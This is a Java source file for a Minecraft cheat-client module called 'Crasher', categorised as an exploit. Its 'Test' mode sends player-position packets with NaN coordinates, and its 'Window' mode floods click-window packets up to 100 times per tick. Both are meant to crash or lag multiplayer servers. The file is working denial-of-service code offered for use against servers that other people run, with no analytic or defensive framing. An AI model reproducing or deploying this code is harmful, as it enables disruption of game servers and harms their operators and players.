package uwu.noctura.module.impl.exploit.crasher;

import com.viaversion.viaversion.libs.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0DPacketCloseWindow;
import net.minecraft.network.play.client.C0EPacketClickWindow;
import org.lwjgl.system.CallbackI;
import uwu.noctura.event.Event;
import uwu.noctura.event.EventType;
import uwu.noctura.event.impl.EventFrame;
import uwu.noctura.event.impl.EventMotion;
import uwu.noctura.event.impl.EventUpdate;
import uwu.noctura.module.Category;
import uwu.noctura.module.Module;
import uwu.noctura.module.ModuleInfo;
import uwu.noctura.module.setting.impl.ModeSetting;
import uwu.noctura.module.setting.impl.NumberSetting;
import uwu.noctura.utils.PacketUtil;

@ModuleInfo(name = "Crasher", displayName = "Crasher", cat = Category.Exploit, key = -1)
public class Crasher extends Module {

    public ModeSetting modes = new ModeSetting("Mode", "Window", "Window", "Test");
    public NumberSetting force = new NumberSetting("Force", 1, 1, 100, 1).setCanShow(m -> modes.is("Window"));

    public Crasher(){
        addSettings(modes, force);
    }

    @Override
    public void onEvent(Event e) {
        if(e instanceof EventUpdate){
            if(mc.thePlayer == null) return;
        }
        switch (modes.getMode()){
            case "Test":{
                testMode(e);
                break;
            }
            case "Window":{
                windowMode(e);
                break;
            }
        }
    }

    public void testMode(Event e) {
        if(e instanceof EventUpdate){
            EventUpdate ev = (EventUpdate) e;
            if(mc.thePlayer.ticksExisted < 20) {
                this.toggle();
                return;
            }
            if(ev.isPre()){
                PacketUtil.sendSilentPacket(new C03PacketPlayer.C04PacketPlayerPosition(Float.NaN, Float.NaN, Float.NaN, true));
            }
        }
    }

    public void windowMode(Event e){
        if(e instanceof EventUpdate){
            EventUpdate ev = (EventUpdate) e;
            if(ev.getType().equals(EventType.PRE)){
                return;
            }
            Int2ObjectArrayMap<ItemStack> itemMap = new Int2ObjectArrayMap<>();
            itemMap.put(0, new ItemStack(Items.boat, 1));
            for(int i = 0; i < force.getValue(); i++){
                //C0DPacketCloseWindow
                C0EPacketClickWindow window = new C0EPacketClickWindow(0, 0, 0, 1, itemMap.get(0), (short) 1);
                PacketUtil.sendSilentPacket(window);
            }
        }
    }

}
